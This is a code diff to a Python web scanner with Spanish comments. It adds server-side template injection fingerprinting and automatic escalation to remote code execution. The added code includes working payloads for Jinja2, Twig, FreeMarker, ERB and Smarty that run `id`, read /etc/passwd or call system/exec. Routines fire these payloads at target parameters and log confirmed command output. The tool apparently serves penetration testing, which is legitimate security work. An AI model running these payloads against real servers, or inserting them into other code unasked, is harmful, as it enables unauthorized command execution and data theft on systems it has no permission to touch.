@@ -18,6 +18,113 @@ init()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
+# ---------------------------------------------------------------------------
+# ENGINE FINGERPRINTING Y ESCALACIÓN PARA SSTI
+# ---------------------------------------------------------------------------
+
+# Mapa: payload de prueba → engine que lo evalúa
+_SSTI_ENGINE_PROBES: list = [
+    # (payload, resultado_esperado, engine_candidato)
+    ("{{7*7}}",     "49",       "jinja2_or_twig"),
+    ("${7*7}",      "49",       "freemarker_or_spel"),
+    ("#{7*7}",      "49",       "erb_or_groovy"),
+    ("<%=7*7%>",    "49",       "erb_asp"),
+    ("{7*7}",       "49",       "smarty"),
+    # Disambiguation Jinja2 vs Twig
+    ("{{7*'7'}}",   "7777777",  "twig"),
+    ("{{7*'7'}}",   "49",       "jinja2"),
+]
+
+# Payloads de escalación RCE por engine (ejecutan `id` en Linux o `whoami` en Windows)
+_SSTI_ESCALATION_PAYLOADS: dict = {
+    "jinja2": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+        "{%for x in ().__class__.__base__.__subclasses__()%}{%if x.__name__=='Popen'%}{{x(['id'],stdout=-1).communicate()[0]}}{%endif%}{%endfor%}",
+    ],
+    "twig": [
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{['id']|filter('system')}}",
+        "{{app.request.server.get('PATH')}}",
+    ],
+    "freemarker_or_spel": [
+        "${\"freemarker.template.utility.Execute\"?new()('id')}",
+        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex('id')}",
+        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+    ],
+    "erb_or_groovy": [
+        "<%= `id` %>",
+        "<%= system('id') %>",
+        "<%= File.read('/etc/passwd') %>",
+    ],
+    "erb_asp": [
+        "<%=`id`%>",
+        "<%=IO.read('/etc/passwd')%>",
+    ],
+    "smarty": [
+        "{php}echo `id`;{/php}",
+        "{system('id')}",
+        "{php}system('id');{/php}",
+    ],
+}
+
+# Indicadores de output de id/whoami para confirmar RCE via SSTI
+_SSTI_RCE_INDICATORS: list = [
+    "uid=", "gid=", "groups=",
+    "root", "www-data", "apache",
+    "root:x:0:0:",
+]
+
+
+def _ssti_fingerprint_engine(base_url: str, param: str, method: str,
+                               headers: dict) -> str:
+    """
+    Determina el template engine enviando probes de disambiguation.
+    Retorna el nombre del engine ('jinja2', 'twig', 'freemarker_or_spel',
+    'erb_or_groovy', 'erb_asp', 'smarty') o 'unknown'.
+    Solo se llama cuando ya se confirmó SSTI con 2+ verification_payloads.
+    """
+    for probe, expected, engine in _SSTI_ENGINE_PROBES:
+        try:
+            if method == "get":
+                r = requests.get(base_url, params={param: probe}, headers=headers, verify=False, timeout=5)
+            else:
+                r = requests.post(base_url, data={param: probe}, headers=headers, verify=False, timeout=5)
+            if r.status_code == 200 and expected in r.text:
+                return engine
+        except Exception:
+            continue
+    return "unknown"
+
+
+def _ssti_try_rce(base_url: str, param: str, method: str,
+                   headers: dict, engine: str) -> tuple:
+    """
+    Intenta escalar SSTI a RCE con payloads específicos del engine detectado.
+    Retorna (True, payload, output) si hay output de comando reconocible.
+    """
+    escalation_list = _SSTI_ESCALATION_PAYLOADS.get(engine, [])
+    if engine == "unknown":
+        # Si no se identificó el engine, probar todos
+        escalation_list = [p for pl in _SSTI_ESCALATION_PAYLOADS.values() for p in pl[:1]]
+
+    for ep in escalation_list[:3]:  # Máx 3 por engine
+        try:
+            if method == "get":
+                r = requests.get(base_url, params={param: ep}, headers=headers, verify=False, timeout=5)
+            else:
+                r = requests.post(base_url, data={param: ep}, headers=headers, verify=False, timeout=5)
+            if r.status_code == 200:
+                for indicator in _SSTI_RCE_INDICATORS:
+                    if indicator in r.text:
+                        idx = r.text.find(indicator)
+                        snippet = r.text[max(0, idx - 20):idx + 80].strip()
+                        return True, ep, snippet
+        except Exception:
+            continue
+    return False, "", ""
+
+
 def is_ssti_response(text, payload=None):
     """
     Función ULTRA ESTRICTA para detectar SOLO vulnerabilidades SSTI REALES
@@ -167,32 +274,37 @@ def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
     
     def verify_ssti_vulnerability(base_url, param, method, headers, payload):
         """
-        Verificar que una vulnerabilidad SSTI sea REAL usando múltiples payloads
+        Verificar que una vulnerabilidad SSTI sea REAL usando múltiples payloads.
+        Retorna (is_vulnerable, successful_payloads, engine, rce_achieved, rce_output).
         """
         verification_count = 0
         successful_payloads = []
-        
-        # Probar múltiples payloads de verificación
-        for verify_payload in verification_payloads[:4]:  # Probar los primeros 4
+
+        for verify_payload in verification_payloads[:4]:
             try:
                 if method == "get":
                     verify_r = requests.get(base_url, params={param: verify_payload}, headers=headers, verify=False, timeout=5)
                 else:
                     verify_r = requests.post(base_url, data={param: verify_payload}, headers=headers, verify=False, timeout=5)
-                
+
                 if verify_r.status_code == 200 and is_ssti_response(verify_r.text, verify_payload):
                     verification_count += 1
                     successful_payloads.append(verify_payload)
-                    
-                    # Si ya tenemos 2 confirmaciones, es suficiente
                     if verification_count >= 2:
                         break
-                        
-            except:
+            except Exception:
                 continue
-        
-        # Solo considerar vulnerable si al menos 2 payloads funcionan
-        return verification_count >= 2, successful_payloads
+
+        if verification_count < 2:
+            return False, successful_payloads, "unknown", False, ""
+
+        # Fingerprinting del engine
+        engine = _ssti_fingerprint_engine(base_url, param, method, headers)
+
+        # Intentar escalación a RCE
+        rce_ok, rce_payload, rce_output = _ssti_try_rce(base_url, param, method, headers, engine)
+
+        return True, successful_payloads, engine, rce_ok, rce_output
     
 
     def get_baseline_response(method, url, data=None):      
@@ -264,26 +376,29 @@ def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                 
                 # Solo procesar si la respuesta es exitosa
                 if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
-                    # Verificación OBLIGATORIA con múltiples payloads
-                    is_vulnerable, successful_payloads = verify_ssti_vulnerability(base_url, param, "get", headers, payload)
-                    
+                    is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
+                        verify_ssti_vulnerability(base_url, param, "get", headers, payload)
+
                     if not is_vulnerable:
-                        continue  # No es vulnerable - falsos positivos filtrados
-                    
-                    # Verificar si ya se explotó esta combinación específica
+                        continue
+
                     if not vuln_manager.is_already_exploited(base_url, param):
-                        # Verificar falso positivo
                         if not vuln_manager.verify_false_positive(base_url, payload, "GET", custom_headers, random_agent):
-                            # Marcar como explotada
                             vuln_manager.mark_as_exploited(base_url, param)
                             vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                            
-                            # Salida sincronizada usando la nueva función
                             with stdout_lock:
                                 encoded = quote(payload, safe='')
-                                print_vulnerability(f"\033[1;32m[GET][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
-                            
-                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
+                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
+                                rce_label = f" \033[1;31m[RCE CONFIRMED: {rce_output[:60]}]\033[0m" if rce_ok else ""
+                                print_vulnerability(
+                                    f"\033[1;32m[GET][SSTI][{engine_label}]\033[0m "
+                                    f"{base_url}?{param}={encoded}{rce_label}"
+                                )
+                            entry = f"{base_url}?{param}={quote(payload, safe='')}"
+                            entry += f"|||SSTI_ENGINE:{engine}"
+                            if rce_ok:
+                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
+                            urls_vulnerables.append(entry)
                     break
             except requests.exceptions.Timeout:
                 continue
@@ -326,22 +441,28 @@ def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                 
                 # Solo procesar si la respuesta es exitosa
                 if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
-                    # Verificación OBLIGATORIA con múltiples payloads
-                    is_vulnerable, successful_payloads = verify_ssti_vulnerability(base_url, param, "post", headers, payload)
-                    
+                    is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
+                        verify_ssti_vulnerability(base_url, param, "post", headers, payload)
+
                     if not is_vulnerable:
-                        continue  # No es vulnerable - falsos positivos filtrados
-                    
+                        continue
+
                     with lock:
                         if base_url not in vulnerable_endpoints:
                             vulnerable_endpoints.add(base_url)
-                            
-                            # Salida sincronizada usando la nueva función
                             with stdout_lock:
                                 encoded = quote(payload, safe='')
-                                print_vulnerability(f"\033[1;32m[POST][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
-                            
-                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
+                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
+                                rce_label = f" \033[1;31m[RCE CONFIRMED: {rce_output[:60]}]\033[0m" if rce_ok else ""
+                                print_vulnerability(
+                                    f"\033[1;32m[POST][SSTI][{engine_label}]\033[0m "
+                                    f"{base_url}?{param}={encoded}{rce_label}"
+                                )
+                            entry = f"{base_url}?{param}={quote(payload, safe='')}"
+                            entry += f"|||SSTI_ENGINE:{engine}"
+                            if rce_ok:
+                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
+                            urls_vulnerables.append(entry)
                     break
             except requests.exceptions.Timeout:
                 continue
@@ -403,25 +524,31 @@ def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
 
                 # Solo procesar si la respuesta es exitosa
                 if res.status_code == 200 and is_ssti_response(res.text, payload) and res.text.lower() != baseline:
-                    # Verificación OBLIGATORIA con múltiples payloads
-                    # Para formularios, usar el primer parámetro para la verificación
                     first_param = list(data.keys())[0] if data else None
                     if first_param:
-                        is_vulnerable, successful_payloads = verify_ssti_vulnerability(full_url, first_param, method, headers, payload)
-                        
+                        is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
+                            verify_ssti_vulnerability(full_url, first_param, method, headers, payload)
                         if not is_vulnerable:
-                            continue  # No es vulnerable - falsos positivos filtrados
-                    
+                            continue
+                    else:
+                        engine, rce_ok, rce_output = "unknown", False, ""
+
                     with lock:
                         if full_url not in vulnerable_endpoints:
                             vulnerable_endpoints.add(full_url)
-                            
-                            # Salida sincronizada usando la nueva función
                             with stdout_lock:
                                 encoded_data = {k: quote(v, safe='') for k, v in data.items()}
-                                print_vulnerability(f"\033[1;32m[FORM][VULNERABLE]\033[0m {full_url}\n{encoded_data}")
-                            
-                            urls_vulnerables.append(f"{full_url}")
+                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
+                                rce_label = f" [RCE CONFIRMED: {rce_output[:60]}]" if rce_ok else ""
+                                print_vulnerability(
+                                    f"\033[1;32m[FORM][SSTI][{engine_label}]\033[0m "
+                                    f"{full_url}{rce_label}\n{encoded_data}"
+                                )
+                            entry = f"{full_url}"
+                            entry += f"|||SSTI_ENGINE:{engine}"
+                            if rce_ok:
+                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
+                            urls_vulnerables.append(entry)
         except requests.exceptions.Timeout:
             pass  # Skip timeouts silently
         except requests.exceptions.RequestException:
